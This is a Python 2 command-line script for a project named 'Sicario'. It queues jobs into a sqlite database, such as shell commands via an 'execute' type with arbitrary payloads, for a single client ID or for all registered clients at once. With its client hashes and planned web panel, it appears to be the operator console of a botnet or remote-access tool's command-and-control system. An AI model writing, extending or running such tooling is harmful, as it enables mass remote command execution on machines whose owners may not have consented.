from __future__ import print_function
# Warning: This is a temporary CLI. I have moving Sicario to mysql and creating web panel in plans, but not for now.
# And yes, it does not support single clients. One or all. Web UI will have all these fancy gadgets, this is 
# for developing

import sys, sqlite3

def invalid_parameters ():
	print('Invalid parameters.')
	sys.exit(1)
	return True

def main (): 
	clients = raw_input('Client ID or "all": ')
	clients_len = len(clients)

	if clients_len != 32 and clients != 'all':
		return invalid_parameters()		

	command = raw_input('Sicario supported command to execute WITHOUT payload (execute for executing shell commands): ')
	if not command or ' ' in command:
		return invalid_parameters()

	payload = raw_input('Payload (arguments for command): ')
	if not payload: 
		return invalid_parameters()

	print('Clients: {}'.format(clients))
	print('Command to execute: {}'.format(command))
	print('Payload: {}'.format(payload))

	if (raw_input('Are you sure? [y/n]: ') != 'y'):
		sys.exit(0)

	try:
		handler = sqlite3.connect('../db/sicario.db')
	except: 
		print('[*] Connection to database failed!')
		sys.exit(1)

	cursor = handler.cursor()

	if clients == 'all':
		query = cursor.execute('SELECT id, hash FROM clients WHERE 1')
		clients = cursor.fetchall()
		clients_len = len(clients)
		print('{} clients in total. Sending jobs..'.format(clients_len))
		print('Warning: Do not quit terminal before all jobs will be sent, or no job will be sent.')

		for num, client in enumerate(clients):
			cursor.execute('INSERT INTO jobs (client_key, type, processed, payload) VALUES (?, ?, 0, ?)', (client[1], command, payload))
			print('{}/{} jobs processed.. '.format(num+1, clients_len),end="\r")
			sys.stdout.flush()

		handler.commit()
		handler.close()
		print('\nAll sent!')

	else:
		cursor.execute('INSERT INTO jobs (client_key, type, processed, payload) VALUES (?, ?, 0, ?)', (clients, command, payload))
		handler.commit()
		handler.close()
		print('Job sent!')


if __name__ == '__main__':
	main()